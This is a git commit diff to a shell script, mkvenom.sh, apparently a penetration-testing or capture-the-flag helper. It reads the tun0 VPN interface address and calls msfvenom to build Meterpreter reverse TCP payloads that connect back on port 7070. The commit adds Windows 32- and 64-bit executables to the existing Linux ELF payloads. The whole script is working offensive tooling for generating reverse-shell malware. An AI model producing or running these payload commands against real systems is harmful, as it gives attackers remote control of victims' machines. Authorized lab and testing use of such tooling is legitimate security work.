f3e5d1ad58dfcbb4f755a713481a6db50e8f5512
toneillcodes <148013535+toneillcodes@users.noreply.github.com>
2024-11-23 19:17:49 -0500

    Adding windows 86 and 64 bit meterpeter commands

--- mkvenom.sh
+++ mkvenom.sh
@@ -1,7 +1,11 @@
-#!/bin/bash
-# grab IP
+#check IP
 export IPADDR=`ip -brief address show tun0 | awk '{print $3}' | awk -F/ '{print $1}'`
 
-# generate payloads with IP
+echo "IPADDR = $IPADDR"
+
+#generate payloads with IP
 msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=7070 -f elf > linux_86_meterpeter_reverse_tcp.elf
 msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=7070 -f elf > linux_64_meterpeter_reverse_tcp.elf
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=7070 -f exe > windows_86_meterpeter_reverse_tcp.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=7070 -f exe > windows_64_meterpeter_reverse_tcp.exe
